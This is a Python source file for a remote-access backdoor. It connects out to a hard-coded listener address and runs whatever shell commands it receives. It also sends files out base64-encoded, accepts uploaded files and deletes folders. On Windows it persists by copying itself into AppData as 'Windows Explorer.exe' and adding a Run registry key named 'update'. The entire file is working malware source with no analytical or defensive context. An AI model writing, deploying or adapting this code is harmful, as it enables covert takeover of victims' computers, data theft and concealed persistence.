#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import socket
import subprocess
import json
import base64
import time
import platform
from termcolor import colored
import os
import shutil
import sys

class Backdoor:
    def __init__(self,ip,port):
        self.ip=ip
        self.port=port
        self.connection=None
        if platform.system() == "Windows":
            self.persistent()

    def persistent(self):
        backdoor_path=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(backdoor_path):
            shutil.copyfile(sys.executable,backdoor_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+backdoor_path+'"',shell=True)

    def connect(self):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((self.ip,self.port))
        try:
            self.send(socket.gethostname())
        except socket.error as e:
            self.send(self.color_text("[-] Cannot send client computer name to server \n[-] Error message:"+str(e),2))

    def color_text(self, message, status):
        if status == 1:
            return colored(message, "green")
        elif status == 2:
            return colored(message, "red")
        elif status == 3:
            return colored(message, "blue")

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(str.encode(json_data))


    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def system_command_execute(self,command):
        try:
            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result_byte = result.stdout.read() + result.stderr.read()
            return result_byte.decode("utf-8", errors="replace")
        except UnicodeDecodeError as e:
            return  self.color_text("[-] Command could not be processed! \n[-] Error message:"+str(e),2)
        except Exception as e:
            return  self.color_text("[-] Command could not be processed! \n[-] Error message:"+str(e),2)


    def change_directory(self,directory):
        try:
            os.chdir(directory)
            return self.color_text("[+] Switched to '" + str(os.getcwd()) + "' directory",1)
        except:
            return self.color_text("[-] Invalid directory! ",1)

    def is_folder(self,path):
        if os.path.isdir(path):
            try:
                shutil.rmtree(path)
                return self.color_text("[+] '" + str(path) + "' folder successfully deleted",1)
            except:
                return self.color_text("[-] '" + str(path) + "' folder could not be deleted!",1)
        elif os.path.isfile(path):
            return False


    def check_file(self,file):
        return os.path.isfile(path=file)

    def read_file(self,file):
        if self.check_file(file):
            try:
                with open(file,"rb") as f:
                    return str(base64.b64encode(f.read()),"utf-8")
            except Exception as e:
                return self.color_text("[-] File download failed!"+"\n[-] Error message:"+str(e),2)
        else:
            return self.color_text("[-] File '"+ str(file)+ "' does not exist!",2)


    def write_file(self,file,content):
        try:
            with open(file,"wb") as file:
                file.write(base64.b64decode(content))
                return self.color_text("[+] File successfully uploaded",1)
        except Exception as e:
            return self.color_text("[-] File upload failed!"+"\n[-] Error message:"+str(e),2)

    def execute_command(self):
        try:
            self.connection.recv(10)
        except Exception as e:
            print(self.color_text("[-] Could not initiate communication with server",2))
            print(self.color_text("[-] Error message:"+str(e),2))

        self.send(str(os.getcwd()) + " >> ")

        while True:
            command=self.receive()
            try:
                if command[0]=="quit":
                    self.send(" ")
                    self.connection.close()
                    break

                elif command[0]=="cd" and len(command) > 1:
                    result=self.change_directory(command[1])
                elif command[0]=="download":
                    if len(command)>1:
                        result=self.read_file(command[1])
                    else:
                        result=self.color_text("[-] Please specify the file to download!",2)
                elif command[0]=="upload":
                    result=self.write_file(command[1],command[2])
                elif command[0]=="del" and platform.system()=="Windows":
                    result=self.is_folder(command[1])
                    if not result:
                        result = self.system_command_execute(' '.join(command))
                        if not result:
                            result = " "
                elif command[0] == "getcwd":
                    result = " "
                else:
                    result=self.system_command_execute(' '.join(command))
                    if not result:
                        result=" "

            except Exception as e:
                 result = self.color_text("[-] Error during command execution",2)
                 result+=self.color_text("[-] Error message:"+str(e),2)

            if command[0]=="download":
                self.send(result)
            elif result and command[0]!="quit":
                self.send(result+"\n\n"+self.color_text(str(os.getcwd())+" >> ",3))

def main():
    listenerIP="192.168.0.30"
    listenerPort=2019
    backdoor = Backdoor(listenerIP,listenerPort)
    while True:
        try:
            backdoor.connect()
        except Exception as e:
            print(backdoor.color_text("[-] Socket connection error",2))
            print(backdoor.color_text("[-] Error message:"+str(e),2))
            time.sleep(5)
        else:
            break
    try:
        backdoor.execute_command()
    except Exception as e:
        print(backdoor.color_text("[-] Main error",2))
        print(backdoor.color_text("[-] Error message:"+str(e),2))
    backdoor.connection.close()

if __name__ == '__main__':
    while True:
        main()